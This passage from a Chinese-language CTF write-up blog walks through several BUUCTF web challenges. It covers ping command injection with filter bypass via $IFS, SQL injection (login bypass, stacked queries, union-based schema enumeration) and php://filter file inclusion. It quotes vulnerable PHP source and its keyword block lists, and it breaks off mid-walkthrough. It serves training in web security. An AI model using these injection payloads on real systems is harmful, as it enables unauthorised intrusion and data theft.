+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payload:<span class="token number">1</span><span class="token string">' or 1 ='</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="5、-ACTF2020-新生赛-Exec"><a href="#5、-ACTF2020-新生赛-Exec" class="headerlink" title="5、[ACTF2020 新生赛]Exec"></a>5、[ACTF2020 新生赛]Exec</h1><p><em><strong><u>给了一个ping的输入框</u></strong></em></p>
+<blockquote>
+<p>php模拟我们常用的DOS命令的ping命令方法，主要用到的是php的**<u>内置函数</u>**exec来调用系统的ping命令,从而实现ping命令功能。 </p>
+<p>从而想到通过exec函数来进行RCE。 </p>
+</blockquote>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a><code>知识点：</code></h2><p><code>注意使用exec函数必须需要服务器支持调用系统内置函数才行。另外也可以使用system等php内置函数来实现这个功能</code></p>
+<p><code>exec执行一个外部程序</code></p>
+<p><code>执行给予的命令command，不过它并不会输出任何东西，它简单的从命令的结果中传回最后一行，如果你需要去执行一个命令，并且从命令去取得所有资料时，可以使用passthru()这个函数。</code></p>
+<p><code>system---执行外部程式并且显示输出</code></p>
+<p><code>system()执行给予的命令command，并且输出结果。如果有给予参数return_var，则执行命令的状态码将会写到这个变量。</code></p>
+<p><code>注意:如果你允许来自使用者输入的资料，可以传递到此函数，那么你应该使用escapeshellcmd()来确定此使用者无法哄骗(trick)系统来执行武断的(arbitrary)命令。</code></p>
+<p><code>注意:如果你使用此函数来启动一个程式，而且希望在背景里(background)执行的时候离开它，你必须确定此程式的输出是转向(redirected)到一个文件或是一些输出的资料流，否则PHP将会悬挂(hang)直到程式执行结束。</code></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token comment">;前面和后面命令都要执行，无论前面真假</span>
+|直接执行后面的语句
+||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
+&amp;前面和后面命令都要执行，无论前面真假
+&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">aaa ; cat /flag(cat flag错误，猜测：/可能是查找所有目录下的flag)
+aaa | cat /flag
+aaa ||cat /flag
+aaa &amp; cat /flag
+127.0.0.1 &amp;&amp; cat /flag(执行无flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120243396?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165128968616782184694889%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165128968616782184694889&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-120243396.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BACTF2020+%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec+1&spm=1018.2226.3001.4187">参考</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nerrissa/articles/4929462.html">php命令exec</a></p>
+<h1 id="6、-SUCTF-2019-EasySQL"><a href="#6、-SUCTF-2019-EasySQL" class="headerlink" title="6、[SUCTF 2019]EasySQL"></a>6、[SUCTF 2019]EasySQL</h1><h2 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h2><p><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-254981.html">PHP短路运算符</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"国士无双，您一路走好，坚信未来也一定满是赤旗的世界"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> 
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//转换类型为bool型，a=1，b被短路</span>
+    <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//bool不参与数值运算</span>
+    <span class="token variable">$b</span><span class="token operator">++</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment">//1 21</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/105241226?ops_request_misc=%7B%22request_id%22:%22165130361716782390589859%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165130361716782390589859&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-105241226.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BSUCTF+2019%5DEasySQL+1&spm=1018.2226.3001.4187"> 加深理解</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/StevenOnesir/article/details/110203051?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=1">高级思路打击</a></p>
+<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><h3 id="第一种：手工盲注"><a href="#第一种：手工盲注" class="headerlink" title="第一种：手工盲注"></a>第一种：手工盲注</h3><blockquote>
+<p>他的后端既然能做到<strong>数字回显</strong>==<u><strong>字母不回显</strong></u>==，说明有一个 ==或== 结构，而且不直接回显flag，但作为一道题目，from一定是from flag。<br>所以猜测后端：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name type-declaration">select</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token class-name">flag</span> from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<p>结合：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">---+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+</span>
+<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> a <span class="token keyword">from</span> test<span class="token punctuation">;</span>
+ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>数字可以回显，字母不可以</p>
+</blockquote>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">------+</span>
+<span class="token operator">|</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+</span>
+<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+</span>
+<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> a<span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>
+ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>
+ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span>: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'|id from test'</span> at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>字母字符均不可以</p>
+</blockquote>
+<h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><p><code>*,1</code></p>
+<p>相当于</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token keyword">from</span> Flag
+<span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> Flag
+语句含义：从Flag表中，查询所有字段，以及将最后一个字段值显示为<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="第二种：堆叠注入"><a href="#第二种：堆叠注入" class="headerlink" title="第二种：堆叠注入"></a>第二种：<strong>堆叠注入</strong></h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p>
+<p>看一个<code>writeup</code>上说，第一种解法是非预期解，预期解应该是<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>。<br>听都没听过，去查了下<code>set sql_mode=PIPES_AS_CONCAT</code>，用来处理<code>|</code>的符号的，将<code>或</code>操作改成<code>连接</code>操作。</p>
+<h1 id="7、-极客大挑战-2019-Secret-File1"><a href="#7、-极客大挑战-2019-Secret-File1" class="headerlink" title="7、[极客大挑战 2019]Secret File1"></a>7、[极客大挑战 2019]Secret File1</h1><h2 id="题目环境："><a href="#题目环境：" class="headerlink" title="题目环境："></a>题目环境：</h2><blockquote>
+<h1 id="你想知道蒋璐源的秘密么？"><a href="#你想知道蒋璐源的秘密么？" class="headerlink" title="你想知道蒋璐源的秘密么？"></a>你想知道蒋璐源的秘密么？</h1><p>想要的话可以给你，去找吧！把一切都放在那里了！</p>
+</blockquote>
+<p>F12看源码</p>
+<blockquote>
+<p><code>href=&quot;./Archive_room.php&quot;</code></p>
+</blockquote>
+<p>去看看</p>
+<blockquote>
+<h1 id="我把他们都放在这里了，去看看吧"><a href="#我把他们都放在这里了，去看看吧" class="headerlink" title="我把他们都放在这里了，去看看吧"></a>我把他们都放在这里了，去看看吧</h1><p><a target="_blank" rel="noopener" href="http://b3d20ddb-6910-453b-9b82-04aa6ecfc653.node4.buuoj.cn:81/action.php">             SECRET         </a></p>
+<p>Syclover @ cl4y</p>
+</blockquote>
+<blockquote>
+<h1 id="查阅结束"><a href="#查阅结束" class="headerlink" title="查阅结束"></a>查阅结束</h1><p>没看清么？回去再仔细看看吧。</p>
+<p>Syclover @ cl4y</p>
+</blockquote>
+<p>啥也没有，——&gt;页面是直接跳转的</p>
+<h2 id="bp抓包"><a href="#bp抓包" class="headerlink" title="bp抓包"></a>bp抓包</h2><p>返回头中：</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--
+   secr3t.php        
+--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>继续查看</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>
+        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token comment">//flag放在了flag.php里</span>
+<span class="token delimiter important">?></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="尝试传参："><a href="#尝试传参：" class="headerlink" title="尝试传参："></a>尝试传参：</h2><p><code>?file=flag.php</code></p>
+<p>页面除了背景变黑没变化，F12中在style中背景改为白色，无</p>
+<p>源码中过滤了一些关键字</p>
+<h2 id="尝试使用filter过滤器"><a href="#尝试使用filter过滤器" class="headerlink" title="尝试使用filter过滤器"></a>尝试使用filter过滤器</h2><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>进行base64转码后得到flag</p>
+<h2 id="GXYCTF2019-Ping-Ping-Ping1"><a href="#GXYCTF2019-Ping-Ping-Ping1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping1"></a>[GXYCTF2019]Ping Ping Ping1</h2><p>环境描述：</p>
+<blockquote>
+<p>/?ip=</p>
+</blockquote>
+<p>ping一下本机：<code>ping 127.0.0.1</code></p>
+<blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<p>继续：<code>ping 127.0.0.1;ls;</code></p>
+<blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes
+flag<span class="token operator">.</span>php
+index<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p><code>ping 127.0.0.1;ls;cat flag.php</code></p>
+<blockquote>
+<p>/?ip= fxck your space!</p>
+</blockquote>
+<p>?????花里胡哨</p>
+<p>经尝试，过滤了空格</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
+
+<span class="token constant">PING</span> <span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes
+flag<span class="token operator">.</span>php
+index<span class="token operator">.</span>php
+<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
+<span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"
+
+"</span><span class="token punctuation">;</span>
+  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>过滤了flag</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h3><p><code>?ip=127.0.0.1;ls;a=g;b=fla;cat$IFS$b$a.php</code></p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>ps: 参数顺序要注意，ba换位ab，flag会被检测出来：）</strong></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%7B%22request_id%22:%22165208109616782391838497%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165208109616782391838497&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-104297163-null-null.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BGXYCTF2019%5DPing+Ping+Ping+1&spm=1018.2226.3001.4187">ctf ping 命令执行</a></p>
+<h1 id="8、-极客大挑战-2019-LoveSQL1"><a href="#8、-极客大挑战-2019-LoveSQL1" class="headerlink" title="8、[极客大挑战 2019]LoveSQL1"></a>8、[极客大挑战 2019]LoveSQL1</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
+<p>这群该死的黑客，竟然这么快就找到了我的flag,这次我把它们放在了那个地方，哼哼！</p>
+<p>用户名：</p>
+<p>密  码：                            </p>
+<p>Syclover @ cl4y</p>
+</blockquote>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>1.判断注入点：<code>1&#39; or 1=1#</code> 得到回显：</p>
+<blockquote>
+<p>跳转到了check.php页面。并得到了用户名和密码：</p>
+<h1 id="Login-Success"><a href="#Login-Success" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello admin！</p>
+<p>Your password is ‘be53a02c355072e2ef4eaa93c02c9ffb’</p>
+</blockquote>
+<p>2.尝试密码<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>解密失败，还是回到注入的思路上，查询字段数：<br>在url中输入：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' order by 3%23&amp;password=1     存在
+/check.php?username=admin'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>     报错
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>注意：此时是在url中输入的，所以不能用#，而用其url编码%23。</strong></p>
+<p>3.用<code>union</code>查询测试注入点（回显点位）：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<h1 id="Login-Success-1"><a href="#Login-Success-1" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello 2！</p>
+<p>Your password is ‘3’</p>
+</blockquote>
+<p>4.得到回显点位为2和3，查询当前数据库名及版本：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>Hello geek！</p>
+<p>Your password is ‘10.3.18-MariaDB’</p>
+</blockquote>
+<p>5.爆表：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>Hello 2！</p>
+<p>Your password is ‘geekuser,l0ve1ysq1’</p>
+</blockquote>
+<p>6.猜测为：<code>l0ve1ysq1</code>这个表：<br>爆字段：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1'<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>Hello 2！</p>
+<p>Your password is ‘id,username,password’</p>
+</blockquote>
+<p>7.爆数据：</p>
